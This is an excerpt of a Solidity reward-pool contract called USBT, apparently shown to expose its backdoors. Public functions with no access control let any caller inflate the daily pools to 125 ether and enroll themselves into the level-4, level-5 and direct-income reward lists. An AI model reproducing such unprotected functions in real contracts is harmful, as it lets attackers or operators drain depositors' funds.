...
contract USBT is Ownable{
    ...
    uint256 public dailyDiamond;
    uint256 public dailyDoubleDiamond;
    ...
    function getmoney() public{
        dailyDiamond = 125 ether;
        dailyDeposit = 125 ether;
        dailyDoubleDiamond = 125 ether;
    }


    function getinhere() public {
        level4Users.push(msg.sender);
        userInfo[msg.sender].level = 4;
    }

    function getinhere2(bool set) public {
        level5Users.push(msg.sender);
    ...
    function getinDierect() public{
        directIncomeUSers.push(msg.sender);
    }
    ...
    function _distributediamond() private {
        ...
        if(level4Count > 0){
            uint256 reward = dailyDiamond.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level4Users.length; i++){
                if(userInfo[level4Users[i]].level == 4){
    ...
    function _distributeDirectPool() private {
        ...
        if(directCount > 0){
            uint256 reward = dailyDeposit.div(directCount);
            uint256 totalReward;
            for(uint256 i = 0; i < directIncomeUSers.length; i++){
    ...
    function _distributedoubleDiamond() private{
        ...
        if(level5Count > 0){
            uint256 reward = dailyDoubleDiamond.div(level5Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level5Users.length; i++){
                if(userInfo[level5Users[i]].level == 5){
    ...
    function _distributeDeposit(uint256 _amount) private {
        ...
        BUSD.transfer(founderFee, fee);
        uint256 diamond_ = _amount.mul(diamondPoolPercents).div(baseDivider);
        dailyDiamond = dailyDiamond.add(diamond_);
        // diamond = diamond.add(diamond_);
        uint256 doubleDiamond_ = _amount.mul(doubleDiamondPoolPercents).div(baseDivider);
        dailyDoubleDiamond = dailyDoubleDiamond.add(doubleDiamond_);
        // doubleDiamond = doubleDiamond.add(doubleDiamond_);
        uint256 upline_ = _amount.mul(directsPercentage).div(baseDivider);
        dailyDeposit += upline_;
    }
